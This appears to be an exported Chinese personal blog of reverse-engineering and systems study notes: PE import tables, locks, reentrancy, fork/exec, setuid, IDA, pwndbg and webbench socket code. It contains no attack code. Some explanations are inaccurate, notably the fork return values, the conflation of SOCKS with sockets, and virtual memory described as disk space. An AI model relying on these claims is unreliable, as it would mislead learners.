<p>发现静态文件当中[.radata+8h]处的数据为20 5Ch</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056433.png" /></p>
<p>这里需要再查RVA 20 5Ch,仍然属于2000h范围,查5Ch偏移</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056442.png" /></p>
<p>正是函数名:MessageBox字符串</p>
<p>但是这里有一个很大的问题：前前后后总共只出现了字符串，或者说，函数名</p>
<p>这样是不可能调用的，调用函数的唯一方法是获取函数入口点地址，然后移交控制权</p>
<p>这里就需要提到PE loader了</p>
<p>其实字符串翻译成函数入口的操作正是PE loader在装载时做的， 装载器会根据上述流程获取RVA，进而得到函数名，再根据函数名在内存中找到对应DLL，然后装载DLL，根据DLL导出表获得函数地址，并自动替换CALL处的内容</p>
<p>所以导入表是什么？</p>
<p>导入表就是让上述过程不必写一个特殊换算算法就可以轻松查表实现的结构</p>
<p>导出表只需要提一嘴</p>
<p>一般来说EXE文件没有导出表，但是实际上PE文件都可以有导出表</p>
<p>导出表利用字符串来确定目标函数：正如导入表那样</p>
<p>话题回到重定位</p>
<p>搬运一段文字就行</p>
<p>重定位的算法可以描述为：将直接寻址指令中的双字地址加上模块实际装入地址与模块建议装入地址之差。为了进行这个运算，需要有3 个数据，</p>
<p>首先是需要修正的机器码地址；</p>
<p>其次是模块的建议装入地址；</p>
<p>最后是模块的实际装入地址。</p>
<p>在这3 个数据中，模块的建议装入地址已经在PE 文件头中定义了，而模块的实际装入地址是Windows 装载器确定的，到装载文件的时候自然会知道，所以问题的答案很简单，应该被保存在重定位表中的仅仅是需要修正的代码的地址。</p>
<p>事实上正是如此，PE 文件的重定位表中保存的就是一大堆需要修正的代码的地址。</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>《编译、链接与装载》笔记(2)锁,互斥量,原子操作</title>
    <url>/bian-yi-lian-jie-zhuang-zai/bian-yi-lian-jie-yu-zhuang-zai-bi-ji-2-suo-hu-chi-liang-yuan-zi-cao-zuo/</url>
    <content><![CDATA[<p>由于线程之间可以共享数据，这会导致，线程同步安全</p>
<p>一种可行方法为，将风险操作分割为多个线程安全的原子操作，原子操作在一条指令中执行，不会被打断</p>
<p>Windows提供了多种原子操作API，不列举了，需要的时候查查就行</p>
<p>但是一些较复杂的操作，难以分割为线程安全的原子操作，这时就需要锁</p>
<h2 id="正文">正文</h2>
<p>线程同步的思想是避免多个线程同时读取相同数据区域，其他线程需要等待当前读取的线程，将数据访问这一操作原子化（无视访问的数据量的大小以及所需时长而达成了原子化）</p>
<p>锁是非强制的，线程访问数据时会先尝试获取锁，并在结束后释放锁</p>
<p>二元信号量是最简单的锁，多元信号量简称信号量</p>
<p>二元信号量只有0和1两种可能</p>
<p>多元信号量有0到X共X+1种可能，支持多线程访问</p>
<p>当一个线程访问资源时，信号量减一，当为0时，拒绝访问，释放信号量时，信号量加一</p>
<p>信号量可以由任意线程上锁，由任意线程解锁</p>
<p>但是<strong>互斥量</strong>只能由locker解锁</p>
<p>临界区是更为严格的同步手段，临界区加锁称为进入，解锁称为离开</p>
<p>对于前面的情况，在锁定时，操作系统中的任何进程尝试获取锁的行为是完全合法的，尽管结果必然是失败的</p>
<p>但是尝试进入临界区这一行为本身就是非法的</p>
<p>读写锁可以选择锁的性质：独占的还是共享的，具体情况表格懒得列了，有需求的时候回补</p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
  </entry>
  <entry>
    <title>《编译、链接与装载》笔记(3)reentrant、yield return底层机制</title>
    <url>/bian-yi-lian-jie-zhuang-zai/bian-yi-lian-jie-yu-zhuang-zai-bi-ji-3reentrant-yield-return-di-ceng-ji-zhi/</url>
    <content><![CDATA[<p>之前在做C#开发时，了解了一些简单的同协和协程，后来了解到python当中也有，当时不能很好理解那个枚举类，这里补一个笔记</p>
<p>（写完了发现C语言 C# python当中的实现几乎完全不同，有点惊讶）</p>
<p>python的方法是，任何含yield的函数会被标记为类似匿名生成器的东西，是解释器层面的</p>
<p>C#的方法是继承出一个类似python生成器的东西，然后由编译器加上MoveNext() 成员函数,用state变量标记执行的位置：这时编译器层面操作的语法糖，如果我们去手写的话，也完全可以实现</p>
<p>而C语言的reentrant是更底层的，它可以认为是CPU层面的，需要满足下列条件：</p>
<p>不使用，不返回任何非const变量或指针，不依赖任何单个资源的锁，不二次调用任何非reentrant的函数</p>
<p><strong>reentrant函数是在保证高效性的前提下（不使用任何锁，不需要等待，十分高效），多线程下最安全的做法</strong></p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
  </entry>
  <entry>
    <title>《编译、链接与装载》笔记(4)CPU乱序执行的一些细节行为，以及会引发的问题</title>
    <url>/bian-yi-lian-jie-zhuang-zai/bian-yi-lian-jie-yu-zhuang-zai-bi-ji-4cpu-luan-xu-zhi-xing-de-yi-xie-xi-jie/</url>
    <content><![CDATA[<p>源码</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172053290.png" /></p>
<p>假设实例指针pInstance，则下面的操作是在多线程下是危险的多发行为</p>
<p><code>pInstance = new T</code></p>
<p>因为这个操作的三个步骤允许被CPU乱序执行:</p>
<p>第一步,分配内存空间</p>
<p>第二步,把这个空间的地址传给构造函数然后调用构造函数</p>
<p>第三步,把这个空间的地址赋给 <code>pInstance</code></p>
<p>第二第三步是互不影响的,所以会被乱序执行</p>
<p>假设首先第三步执行,然后开始执行构造函数,但是还没执行完毕,此时另一个线程来到第一个if,得到false,然后直接返回,而他返回的对象是还没有构造完毕的实例</p>
<p><strong>这种极端情况下的new函数调用，是很大一部分复现率并非100%的bug的来源</strong>，说人话就是</p>
<p><strong>直接调用new在多线程高发情形下，非常不安全</strong></p>
<p>正确做法是先new到tmp里面，然后加栅（barrier），然后再把tmp赋给pInstance</p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
  </entry>
  <entry>
    <title>《编译、链接与装载》笔记 （1） 现代操作系统任务调度</title>
    <url>/bian-yi-lian-jie-zhuang-zai/bian-yi-lian-jie-yu-zhuang-zai-de-di-ceng-ji-zhi-du-shu-bi-ji-1/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>小时候奇怪过这样一个问题：虽然CPU直接读取硬盘慢，但是硬盘放到内存再放到三级缓存再放到寄存器岂不是更慢</p>
<p>学了一点计组之后理解了其中的一小部分</p>
<h2 id="正文">正文</h2>
<p>曾经在知乎问过这样一个问题，为什么硬盘主控不直接继承在CPU里面，当时被骂惨了2333</p>
<p>其实现代的硬盘（DMA下），是信号控制放行的，而且信号的处理不是由CPU本人接管，而是PCH模块代管，几乎不占用事实上的时间片（注意标题中“现代”二字，这里只考虑打开所有优化，且设备支持的情况，其他情况太多了，本文不与统计）</p>
<p>而且要理解带宽和延迟</p>
<p>这两个指标都可以用时间表示</p>
<p>我们从硬盘放到寄存器的操作，提高了事实上的瞬时延迟，但是提高了整体的交互带宽</p>
<p>那么，讲这么多和任务调度有啥关系？</p>
<p>well，在自动调整优先级的状态下，操作系统的时间片分配会倾向于自愿放弃剩余时间片或是频繁进入不占用CPU的IO的进程</p>
<p>在某个低优先级进程处于长期starvation时，CPU会自动逐渐提高其优先级，最终任何进程都能在等待足够长的时间后正常运行</p>
<p>另外，waitForSingleObject不是类似于PHP当中简单的sleep等待函数，在wait的时候，实际上会放弃所有时间片</p>
<p>所以一种良好的优化习惯是大量IO配合 waitForSingleObject 放弃时间片，提高后续CPU操作优先级</p>
<p>非抢占式的调度机制有一个非常巨大的好处，线程安全有高质量保障，但是不能保证每个程序员都能写出高质量的时间分配逻辑：这有可能导致其他程序永远卡死，无法获取时间片</p>
<p>因此现代的Windows操作系统基本都是抢占式的</p>
<p>回到Linux上</p>
<p>Linux其实并不区分线程和进程，只有task，每个task都是单线程的进程，具有独占的内存空间，执行文件实体和资源等，在实际意义上，共享统一内存空间的task为同一进程的不同线程</p>
<p>所以Linux的多线程如何实现？</p>
<p>这里需要涉及三个函数</p>
<p><code>fork() exec() clone()</code></p>
<p>fork会使用类似链表的方法控制父子关系</p>
<p>新进程的pid相对于父人物是0(可以理解为链表变成两层深度的关系)</p>
<p>该函数返回值永远为为pid,父进程返回的是真正的pid,子进程返回<strong>子pid</strong></p>
<p>二者在top中的真实pid不同,相差1</p>
<p>fork时生成的内存空间会被标记为COW,读取时只生成一份,做到了时间复杂和空间复杂上的高效</p>
<p>exec会直接覆盖当前任务,包括上下文,全部堆栈,全部资源等,并继承原先的pid,除此之外exec函数不返回</p>
<p>一个常见的操作是：先fork出一片新空间，然后时候实际需要的任务代替这片空间（使用exec）</p>
<p>至于clone，他和fork类似，但是实际上创建的是线程，并从指定位置开始执行</p>
<p>fork创建的是相当于进程的任务</p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
  </entry>
  <entry>
    <title>Linux 进程权限划分</title>
    <url>/ni-xiang-xiao-yan-jiu/linux-jin-cheng-quan-xian-hua-fen/</url>
    <content><![CDATA[<p>很奇怪pwnable的题目为什么可以用system cat flag 但是flag文件明明没有权限</p>
<p>查了一圈各种离奇回答都有,看来在需要的时候不太容易找到标准答案,这次一并找到,补个笔记</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181101133.png" /></p>
<p>错误文案示例</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181101079.png" /></p>
<p>描述不清,容易理解错误</p>
<p>其实是real ID和effective ID的关系</p>
<p>如果是执行一个权限为X的可执行文件,一般情况下会把进程权限视作可执行文件所有者,而非执行可执行文件的用户</p>
<p>当然,如果要实现后者情况也很简单</p>
<p>另外还有一种情况,需要介于root和user之间的权限,可执行权限会标记为s</p>
<p>这时候会被允许操作root才能操作的一些文件,但是携带的权限并非root权限,而是用户本身的权限</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>权限</tag>
        <tag>Linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux网络程序逆向小笔记 (1)</title>
    <url>/ni-xiang-xiao-yan-jiu/linux-wang-luo-cheng-xu-ni-xiang-xiao-bi-ji-1/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181100968.png" /></p>
<p>socket函数建立连接时，会通过地址族和传输方式自动推算出使用协议，因此第三个参数一般直接写NULL即可</p>
<p>然后是修改纯数字参数</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181100173.png" /></p>
<p>类似这种</p>
<p>只需要修改成枚举就行了</p>
<p>这里出现了一个“奇怪”的东西，枚举</p>
<p>顺便列一下为什么使用枚举</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181100580.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181101669.png" /></p>
<p>另外，考虑到大部分宏定义的前缀相同，实际上可以写一个插件来确定这些枚举（IDA已经有这样的接口了）</p>
<p>但是笔者没找到相关的插件</p>
<p>或许可以写一个，但是最近在搞网络固件逆向，没空学IDA插件开发，后续如果做了这个项目再补上笔记</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>二进制</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux网络程序逆向小笔记 (2)</title>
    <url>/ni-xiang-xiao-yan-jiu/linux-wang-luo-cheng-xu-ni-xiang-xiao-bi-ji-2/</url>
    <content><![CDATA[<p>有的时候，一些相似的网络数据包结构体类型IDA会分析错误，在本例中，sockaddr_in被错误分析为 sockaddr ，看得很不方便</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053803.png" /></p>
<p>修改方法还挺简单的（但是有点难以想象是如何保证的，毕竟是字符串匹配）</p>
<p>在最上面的声明，找到对应的变量</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053629.png" /></p>
<p>然后按Y</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053729.png" /></p>
<p>直接改名字</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181054704.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181054897.png" /></p>
<p>然后就分析正确了</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181054779.png" /></p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>二进制</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>main和_main节区</title>
    <url>/ni-xiang-xiao-yan-jiu/main-he-main-jie-qu/</url>
    <content><![CDATA[<p>前者是main函数,后者是与mian函数相关的,由编译器生成的内容</p>
<p>但是在部分编译平台上有所不同</p>
<p>总的来说一般不需要太在意这一点</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>编译</tag>
      </tags>
  </entry>
  <entry>
    <title>mov edi,edi的意义</title>
    <url>/ni-xiang-xiao-yan-jiu/mov-ediedi-de-yi-yi/</url>
    <content><![CDATA[<p>所有WindowsAPI第一句都是mov edi,edi</p>
<p>有点好奇,查了一下原因,写篇笔记</p>
<p>本质上来讲，mov edi,edi相当于在PE中占两字节长度的NOP，消耗的CPU时钟也和NOP相同（在某些常见架构下）</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172057596.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056031.png" /></p>
<p>即使不相同也相近，基本不影响整体效率</p>
<p>提到效率，可能有人已经反应过来了</p>
<p>这个确实是一个在正常状态下完全没意义的指令，只会消耗CPU时钟，他唯一的意义是帮助开发者热更新和打补丁</p>
<p>这基本解决了我对如何实现汇编级热更新和汇编级补丁的所有疑问</p>
<p>参考文章如下</p>
<p>https://devblogs.microsoft.com/oldnewthing/20110921-00/?p=9583</p>
<p>选取几个要点翻译一下</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172057788.png" /></p>
<p>我们在调用系统api的时候，并不是一进去就jmp的，而是先mov edi</p>
<p>这样的话，如果需要热更新这个api就只需要先在全局层面修改dll文件，宏观表现就是hook掉</p>
<p>至于如何修改，这里涉及到机器码长度</p>
<p>long jmp和mov edi,edi的机器码长度是相同的，这样就不用在热更新时修改PE头了，实际上热更新时也不可能修改PE头的节区地址，这会影响到整个文件</p>
<p>Windows系统DLL都有这一行，不过主流编译环境基本都可以让你自己的dll库加上这个指令，只需要在设置里面开启即可</p>
<p>文章还解释了一下为什么不直接用hook来热更新，说不能确定的任一调用者执行点什么的，没看懂，个人感觉从技术上应该可以做到，不过笔者也没做过hook，先按下不表，姑且认为是这样的，估计做过hook实验就明白了</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>开发</category>
        <category>二进制</category>
        <category>逆向</category>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows API</tag>
      </tags>
  </entry>
  <entry>
    <title>pwndbg的笔记汇总(更新中)</title>
    <url>/ni-xiang-xiao-yan-jiu/pwndbg-de-bi-ji-hui-zong-geng-xin-zhong/</url>
    <content><![CDATA[<h2 id="设置flag寄存器">设置flag寄存器</h2>
<p>在32位程序下，<code>regs</code>会直接显示flag寄存器的内容，我们只需要使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p/x  &lt;num&gt;  以十六进制打印</span><br><span class="line">p/t  &lt;num&gt;  以二进制打印</span><br></pre></td></tr></table></figure>
<p>进行进制转换</p>
<p>然后使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set $eflags=   //注意eflags是复数形式</span><br></pre></td></tr></table></figure>
<p>赋值即可</p>
<p>但是64位程序<code>regs</code>不显示标志寄存器,需要使用info reg</p>
<p>后续步骤相同</p>
<h2 id="x指令常见使用方法">x指令常见使用方法</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/&lt;nums&gt;&lt;font&gt;&lt;data_width&gt; &lt;addr&gt;</span><br></pre></td></tr></table></figure>
<p><font>：</p>
<ol type="1">
<li>x 按十六进制格式显示变量。</li>
<li>d 按十进制格式显示变量。</li>
<li>t 按二进制格式显示变量。</li>
<li>i 指令地址格式</li>
<li>c 按字符格式显示变量。</li>
<li>f 按浮点数格式显示变量。</li>
</ol>
<p>&lt;data_width&gt;：</p>
<ol type="1">
<li>b表示单字节，</li>
<li>h表示双字节，</li>
<li>w表示四字节，</li>
<li>g表示八字节</li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>技巧</tag>
        <tag>pwndbg</tag>
      </tags>
  </entry>
  <entry>
    <title>pwntool远程环境坑点笔记</title>
    <url>/ni-xiang-xiao-yan-jiu/pwntool-yuan-cheng-huan-jing-keng-dian-bi-ji/</url>
    <content><![CDATA[<p>如果要连接本地虚拟机的话，记得用桥接，别用NAT</p>
<p>此外就是插件，不要安装pylance（微软官方的调试插件），有兼容性问题，他和微软自带的python插件有一个全局变量名称相同，会直接崩掉</p>
<p>翻了一下GitHub开发日志，已经有人反馈了，但是官方还没修好</p>
<p>而且实际上。。。python插件自己就有很足够的调试功能，pylance的受众定位不明确，本身就是个失败的产品</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>python-exe逆向流程</title>
    <url>/ni-xiang-xiao-yan-jiu/python-exe-ni-xiang-liu-cheng/</url>
    <content><![CDATA[<p>主要记一个笔记</p>
<p>添加pyc文件头的时候注意观察缺失部分是8字节还是16字节</p>
<p>此外，注意观察有没有pyz加密</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>python字节码</tag>
      </tags>
  </entry>
  <entry>
    <title>readelf的一些用法</title>
    <url>/ni-xiang-xiao-yan-jiu/readelf-de-yi-xie-yong-fa/</url>
    <content><![CDATA[<p>-h 帮助列表</p>
<p>-s 打印.symtab和dynsym 外部和内部符号表</p>
<p>-S 打印sections</p>
<p>-ctf 这个选项还没玩明白,貌似挺牛逼,用到了再说</p>
<p>-a 打印所有</p>
<p>其他的用的比较少了</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>webbench源码分析与程序改进及SOCKS网络协议笔记 （1） 环境搭建，程序入手，修复少量因兼容性而出现的bug</title>
    <url>/ni-xiang-xiao-yan-jiu/webbench-yuan-ma-fen-xi-yu-cheng-xu-gai-jin-ji-socks-wang-luo-xie-yi-bi-ji-1-cheng-xu/</url>
    <content><![CDATA[<p>依赖项为ctag，跟着文档安装即可</p>
<p>导入文件，于是便发现了很多代码风格很差的细节</p>
<p>首先是个人建议把socks.c的后缀改为.h，然后再include</p>
<p>因为在现代IDE下，.c后缀的头文件会被双重编译，而且就算是命令行编译可以通过，我也认为头文件不应该用.c后缀的文件</p>
<p>然后笔者这里是用VS在Windows上搭建CentOS8.2远程编译环境，需要手动下载gdb和g++</p>
<p>期间没遇到什么问题，略过</p>
<p>然后由于VS对搜索头文件深度的问题，include &lt;signal.h&gt;文件内定义的数据结构无法正确语法高亮</p>
<p>需要在原项目的基础上直接手动添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;bits/sigaction.h&gt;</span><br><span class="line">#defineh_addrh_addr_list[0]</span><br></pre></td></tr></table></figure>
<p>第二行的#define h_addr h_addr_list[0] 需要特别说明一下，原定义是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#ifdef __USE_MISC</span><br><span class="line">#defineh_addrh_addr_list[0] /* Address, for backward compatibility.*/</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
<p>但是这个if加上去之后会影响VS的识别，这里是为了防止定义失败的一种保障的</p>
<p>__USE_MISC 宏对于主流Linux操作系统而言，如笔者的CentOS是无需考虑的，直接删除if即可</p>
<p>然后笔者这里做了函数名的一些小改动</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053483.png" /></p>
<p>Socket改为fSocket，避免和当代Linux系统函数撞名（webbench是上世纪的项目）</p>
<p>至此，前期操作都已完成，接下来就是添加一些现代化的功能，并改进代码行文</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>开发</category>
        <category>二进制</category>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>开源项目</tag>
      </tags>
  </entry>
  <entry>
    <title>webbench源码分析与程序改进及SOCKS网络协议笔记 （2）什么是socks，Linux平台面向socks编程笔记</title>
    <url>/ni-xiang-xiao-yan-jiu/webbench-yuan-ma-fen-xi-yu-cheng-xu-gai-jin-ji-socks-wang-luo-xie-yi-bi-ji-2-shi-me/</url>
    <content><![CDATA[<p>在单端多进程，IP池有限等因素的加持下，出现了socks协议，本质上来说，假如目标IP为192.168.1.2，端口为88，则指针“192.168.1.2:88”所指向的目标，就是一个socks对象实例</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172115498.png" /></p>
<p>socks的本义其实是网络数据线末端的那个卡扣</p>
<p>另外补一个数据边界的笔记</p>
<p>SOCK_STREAM是无边界的，SOCK_DGRAM是有边界的</p>
<p>这种边界并非体现在底层硬件的MTU大小和切片分发，分片传输机制，而是体现在通信双方应用层面，在这个问题上，我们要把硬件层看成透明的</p>
<p>然后如何理解边界一词，也就是数据是连续的，接受和发送是异步的，读取和发送可以是断续的，可以在buf满时操作，也可以在未满时操作，双方的行动不需要统一，虽然内容可以是断续的，但连接是流状的，是连续存在的</p>
<p>而有数据边界则恰恰相反，收发的连接双方在线程操作buf的次数和相对行为上必须同步，同时收发包的顺序无法做到相同</p>
<h2 id="面向socks协议栈开发">面向socks协议栈开发</h2>
<p>代码中出现了一堆底层类和结构体，正好学一下TCP协议，之前草草学过一点点，基本就只知道了个DHCP。。。</p>
<p>sockaddr_in结构体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct sockaddr_in &#123;</span><br><span class="line">               sa_family_t    sin_family; /* address family: AF_INET */ 指明协议（实际上这个结构体是专门用于IPv4的）</span><br><span class="line">               in_port_t      sin_port;   /* port in network byte order */指明端口</span><br><span class="line">               struct in_addr sin_addr;   /* internet address */指明地址</span><br><span class="line"></span><br><span class="line">               //某些版本的源码中,此处另有八个字节的零位对齐</span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           struct in_addr &#123;</span><br><span class="line">               uint32_t       s_addr;     /* address in network byte order */只能IPv4</span><br><span class="line">           &#125;;</span><br></pre></td></tr></table></figure>
<p>文档如下</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172115948.png" /></p>
<p>hostent结构体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct hostent &#123;</span><br><span class="line">char *h_name; //域名字符串</span><br><span class="line">char **h_aliases;  //别名字符串</span><br><span class="line">int h_addrtype;//IPv4</span><br><span class="line">int h_length;</span><br><span class="line">char **h_addr_list;</span><br><span class="line">// 网络字节序的IP地址</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>写完注释的fSocks函数如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int fSocket(const char *host, int clientPort)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int sock;</span><br><span class="line">    unsigned long inaddr;//二进制形式地址</span><br><span class="line">    struct sockaddr_in ad;//存放地址</span><br><span class="line">    struct hostent *hp;</span><br><span class="line">    </span><br><span class="line">    memset(&amp;ad, 0, sizeof(ad)); //分配内存</span><br><span class="line">    ad.sin_family = AF_INET;  //IPv4</span><br><span class="line"></span><br><span class="line">    inaddr = inet_addr(host);//将地址字符串转二进制形式的地址</span><br><span class="line">    if (inaddr != INADDR_NONE)//INADDR_NONE报错,如果输入非法IP字符串255 IP,都会出现该报错</span><br><span class="line">        memcpy(&amp;ad.sin_addr, &amp;inaddr, sizeof(inaddr));</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        hp = gethostbyname(host);//接收到exception为INADDR_NONE的IP,尝试解析该IP</span><br><span class="line">        if (hp == NULL)//无法解析IP,证明IP错误</span><br><span class="line">            return -1;</span><br><span class="line">        memcpy(&amp;ad.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);//可以向DNS解析IP,IP正确</span><br><span class="line">    &#125;</span><br><span class="line">    ad.sin_port = htons(clientPort);//把int型转换为网络传输字节型</span><br><span class="line">    </span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM, 0);//建立IPv4,流格式,TCP数据连接,获取连接FD</span><br><span class="line">    if (connect(sock, (struct sockaddr *)&amp;ad, sizeof(ad)) &lt; 0)//double check Link exist</span><br><span class="line">        return -1;</span><br><span class="line">    return sock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后就是主体部分了</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>开发</category>
        <category>二进制</category>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>开源项目</tag>
      </tags>
  </entry>
  <entry>
    <title>webbench源码分析与程序改进及SOCKS网络协议笔记 （3）main文件解析</title>
    <url>/ni-xiang-xiao-yan-jiu/webbench-yuan-ma-fen-xi-yu-cheng-xu-gai-jin-ji-socks-wang-luo-xie-yi-bi-ji-3-main-wen-jian/</url>
    <content><![CDATA[<p>通读了一遍 主要逻辑是</p>
<p>通过分支选择来append字符串，然后发出去</p>
<p>fork与sleep的配合精确控制child数量，同时保证只有一层child关系</p>
<p>粗略看完一遍感觉封装度太高了，宏观层面看起来很简单</p>
<p>拓展POST功能这茬子事先放一放，先更新pwnable靶场的通关WP</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>开发</category>
        <category>二进制</category>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>开源项目</tag>
      </tags>
  </entry>
  <entry>
    <title>80386与8086内存寻址机制的区别及MMU访问分权底层机制</title>
    <url>/ni-xiang-xiao-yan-jiu/er-jin-zhi-za-wen-3-80386-yu-8086-nei-cun-xun-zhi-ji-zhi-de-qu-bie-ji-mmu-fang-wen-fen-quan/</url>
    <content><![CDATA[<p>写了很多东西啊,一边写一边看,然后看到了一句话,于是都删了,因为发现这些内容没啥用</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172108944.png" /></p>
<h2 id="现在可公开的信息">现在可公开的信息</h2>
<p>首先要理解各种机制再历史上出现的时间顺序和因果顺序</p>
<p>首先是当时技术力如果想要大面积制造寄存器,那么只能是制造16位的,但是以当时的软件普遍开支来看,20位的总线才能算很够用,因此8086实模式采用了线性地址10H×偏移+段地址</p>
<p>但是发展到32位之后,20位的总线已经不需要使用两个16位寄存器填满数据了,相反还需要扩大总线为32位</p>
<p>当时眼光来看 4GB的空间已经十分够用,所以就保持了这样</p>
<p>但是段寄存器就显得毫无用处了,因为我们只需要一个偏移地址寄存器就可以寻址所有4GB内存空间</p>
<p>此时在保护模式和实模式的区别就显现出来了,实模式直接通过段寄存器和偏移地址寻址,是"实实在在的物理地址"</p>
<p>而保护模式下的段寄存器则变为保护信息段选择器，通过该寄存器从段描述符表中选择权限，优先级，门描述符等</p>
<p>只有这些属性确定了，才可以对相应内存区块进行操作</p>
<p>但为什么我们在逆向32位程序的时候，并未在汇编代码当中发现段选择器的相关内容？</p>
<p>因为这种底层信息交给程序员修改太不安全了，所以：</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172107409.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172108648.png" /></p>
<p>另外是分页和虚拟内存，</p>
<p>实际上可以把虚拟内存看作未加载的页，缺页时尝试加载的话才会放入物理内存</p>
<p>或者换句话来说，虚拟内存其实就是硬盘空间，虚拟内存某种意义上根本不是物理内存的衍生，因为他所包含的内容是待加载的页，或者是已经加载过但是暂时不需要的页，我们可以认为虚拟内存就是硬盘空间，因为虚拟内存的所有物理属性都和实际的硬盘相同，他只是划分了一个空间，这段线性空间便于寻道，用于存放完全未加载的东西的copy</p>
<p>这段话不知道有没有说明白</p>
<p>此外物理内存到虚拟内存的映射是指针式的</p>
<p>被映射的dll实际上只有一份,无论是源文件,还是虚拟内存中的copy还是物理内存的指针</p>
<p>这样的话,一万个程序如果都调用了一个相同的dll当中的相同api,内存开销其实是非常小的</p>
<p>另外有一种攻击手法,我们可以修改页表并指定一个并不存在的页面映射,或者说是伪造的页面映射</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>Windows权限保护机制与权限门机制</title>
    <url>/ni-xiang-xiao-yan-jiu/er-jin-zhi-za-wen-4-windows-quan-xian-bao-hu-ji-zhi-yu-quan-xian-men-ji-zhi/</url>
    <content><![CDATA[<p>思考一个问题</p>
<p>高权限的,一旦使用就会造成一定安全隐患的函数,API如何能安全分配给其他子程序使用权限?(把操作系统本身看作主程序,其他程序看作子程序)</p>
<p>换句话来说,低权限的程序如何能安全获取高权限程序(API可以看作是子例,也就是广义的程序)的使用权</p>
